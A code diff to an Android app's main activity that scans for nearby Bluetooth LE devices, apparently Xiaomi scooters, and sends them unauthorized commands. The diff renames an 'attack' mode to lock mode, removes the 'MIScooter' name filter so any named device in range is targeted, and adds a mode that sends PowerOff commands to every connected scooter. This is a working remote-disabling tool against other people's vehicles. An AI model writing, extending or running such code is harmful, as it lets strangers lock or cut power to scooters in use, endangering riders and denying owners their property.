@@ -16,7 +16,6 @@ import android.os.Bundle;
 import permissions.dispatcher.NeedsPermission;
 import permissions.dispatcher.PermissionUtils;
 
-import android.util.Log;
 import android.view.View;
 import android.widget.AdapterView;
 import android.widget.ListView;
@@ -45,9 +44,9 @@ public class MainActivity extends AppCompatActivity {
     private static final String[] PERMISSION_STARTSCAN = new String[] {"android.permission.ACCESS_COARSE_LOCATION"};
     private Thread attacking_thread = null;
     private BluetoothLeScanner bluetoothLeScanner = null;
-    private boolean attack_mode = false;
-    private boolean unlock_mode = false;
+    private boolean lock_mode = false;
     private boolean turbo_mode = false;
+    private boolean poweroff_mode = false;
     private ListView lv_scan = null;
     private BluetoothManager btManager = null;
 
@@ -61,7 +60,8 @@ public class MainActivity extends AppCompatActivity {
             int newRssi = result.getRssi();
             String device_name = newDevice.getName();
             String device_address = newDevice.getAddress();
-            if(device_name == null || !device_name.contains("MIScooter"))
+//            if(device_name == null || !device_name.contains("MIScooter"))
+            if(device_name == null)
             {
                 return;
             }
@@ -142,35 +142,33 @@ public class MainActivity extends AppCompatActivity {
             }
             else {
                 stopScan();
+                stopLockMode();
+                stopTurboMode();
+                stopPowerOffMode();
             }
         });
 
-        FloatingActionButton fab_attack = findViewById(R.id.fab_attack);
-        fab_attack.setOnClickListener(OnClickListener -> {
-                if(!attack_mode)
+        FloatingActionButton fab_lock = findViewById(R.id.fab_lock);
+        fab_lock.setOnClickListener(OnClickListener -> {
+                if(!lock_mode)
                 {
-                    startAttackMode();
+                    startScan();
+                    stopTurboMode();
+                    stopPowerOffMode();
+                    startLockMode();
                 }
                 else {
-                    stopAttackMode();
+                    stopLockMode();
                 }
-        });
-
-        FloatingActionButton fab_unlock = findViewById(R.id.fab_unlock);
-        fab_unlock.setOnClickListener(onClick -> {
-            if(!unlock_mode)
-            {
-                startUnlockMode();
-            }
-            else {
-                stopUnlockMode();
-            }
         });
 
         FloatingActionButton fab_turbo = findViewById(R.id.fab_turbo);
         fab_turbo.setOnClickListener(onClick -> {
             if(!turbo_mode)
             {
+                startScan();
+                stopLockMode();
+                stopPowerOffMode();
                 startTurboMode();
             }
             else {
@@ -178,15 +176,28 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        FloatingActionButton fab_power = findViewById(R.id.fab_power);
+        fab_power.setOnClickListener(onClick -> {
+            if(!poweroff_mode)
+            {
+                startScan();
+                stopLockMode();
+                stopTurboMode();
+                startPowerOffMode();
+            }
+            else {
+                stopPowerOffMode();
+            }
+        });
+
         lv_scan.setOnItemClickListener(new AdapterView.OnItemClickListener() {
             @Override
             public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                 Device device = devicesAdapter.getItem(i);
-
                 DeviceConnection connection_device = devices_connections.get(device.getDevice().getAddress());
 
                 if(connection_device != null) {
-                    connection_device.addCommand(new LockOff());
+                    connection_device.addCommand(new LockOn());
                 }
             }
         });
@@ -209,7 +220,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    private void attack_device(String device_address)
+    private void lock_device(String device_address)
     {
 
         if (this.devices_connections.get(device_address) == null) {
@@ -218,6 +229,18 @@ public class MainActivity extends AppCompatActivity {
 
         DeviceConnection device = this.devices_connections.get(device_address);
         device.addCommand(new LockOn());
+
+    }
+
+    private void poweroff_device(String device_address)
+    {
+
+        if (this.devices_connections.get(device_address) == null) {
+            return;
+        }
+
+        DeviceConnection device = this.devices_connections.get(device_address);
+        device.addCommand(new PowerOff());
 
     }
 
@@ -233,15 +256,6 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    private void unlock_device(String device_address)
-    {
-        if (this.devices_connections.get(device_address) == null) {
-            return;
-        }
-
-        DeviceConnection device = this.devices_connections.get(device_address);
-        device.addCommand(new LockOff());
-    }
     private void connect_device(String device_address)
     {
         if (this.devices_connections.get(device_address) != null) {
@@ -254,14 +268,14 @@ public class MainActivity extends AppCompatActivity {
 
         this.devices_connections.put(device_address, device);
 
-        if(this.attack_mode)
-            attack_device(device_address);
-
-        if(this.unlock_mode)
-            unlock_device(device_address);
+        if(this.lock_mode)
+            lock_device(device_address);
 
         if(this.turbo_mode)
             turbo_device(device_address);
+
+        if (this.poweroff_mode)
+            poweroff_device(device_address);
 
 
     }
@@ -291,14 +305,15 @@ public class MainActivity extends AppCompatActivity {
     private void updateStatus()
     {
         String state = "Scanning:" + this.scanning
-                + " || Attack:" + this.attack_mode + " || Unlock:" + this.unlock_mode
+                + " || PowerOff:" + this.poweroff_mode
+                + " || Lock:" + this.lock_mode
                 + " || Turbo:" + this.turbo_mode;
 
         tv_scanning_state.setText(state);
     }
 
-    private void startAttackMode() {
-        this.attack_mode = true;
+    private void startLockMode() {
+        this.lock_mode = true;
 
         for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
         {
@@ -307,23 +322,9 @@ public class MainActivity extends AppCompatActivity {
         this.updateStatus();
     }
 
-    private void stopAttackMode() {
-        this.attack_mode = false;
+    private void stopLockMode() {
+        this.lock_mode = false;
 
-        this.updateStatus();
-    }
-
-    private void startUnlockMode() {
-        this.unlock_mode = true;
-        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
-        {
-            device_entry.getValue().addCommand(new LockOff());
-        }
-        this.updateStatus();
-    }
-
-    private void stopUnlockMode() {
-        this.unlock_mode = false;
         this.updateStatus();
     }
 
@@ -339,6 +340,22 @@ public class MainActivity extends AppCompatActivity {
 
     private void stopTurboMode() {
         this.turbo_mode = false;
+
+        this.updateStatus();
+    }
+
+    private void startPowerOffMode() {
+        this.poweroff_mode = true;
+
+        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
+        {
+            device_entry.getValue().addCommand(new PowerOff());
+        }
+        this.updateStatus();
+    }
+
+    private void stopPowerOffMode() {
+        this.poweroff_mode = false;
 
         this.updateStatus();
     }
